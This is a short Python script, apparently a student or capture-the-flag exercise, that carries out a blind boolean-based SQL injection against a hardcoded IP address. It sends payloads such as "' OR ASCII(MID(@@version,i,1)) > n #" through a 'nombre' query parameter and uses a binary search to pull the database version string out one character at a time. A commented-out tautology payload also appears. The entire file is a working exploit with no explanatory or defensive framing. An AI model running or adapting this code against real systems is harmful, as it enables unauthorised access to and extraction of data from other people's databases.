import urllib.request
import urllib.parse
import string

endpoint = "http://34.174.213.21:8001/country/restricted"


# payload = "' OR '1' = '1"

def oraculo(payload):
    parametro = urllib.parse.urlencode({"nombre": payload})
    url = f"{endpoint}?{parametro}"
    print(url)
    with urllib.request.urlopen(url) as response:
        return response.read().decode() == 'true'

# oraculo(payload)


length = 25
#for range(1, length + 1):

# print(sorted([[x, ord(x)] for x in string.printable]))

expresion = "@@version"

cadena = ""
for i in range(1, length + 1):
    lower_limit = 31
    upper_limit = 127

    while lower_limit < upper_limit:
        midpoint = (lower_limit + upper_limit) // 2

        payload = f"' OR ASCII(MID({expresion},{i},1)) > {midpoint} #"
        if oraculo(payload):
            lower_limit = midpoint + 1
        else:
            upper_limit = midpoint

        print("Probando caracter", chr(lower_limit))

    if lower_limit <= 32:
        break

    print("Se encontró caracter", chr(lower_limit))
    cadena += chr(lower_limit)
print(cadena)
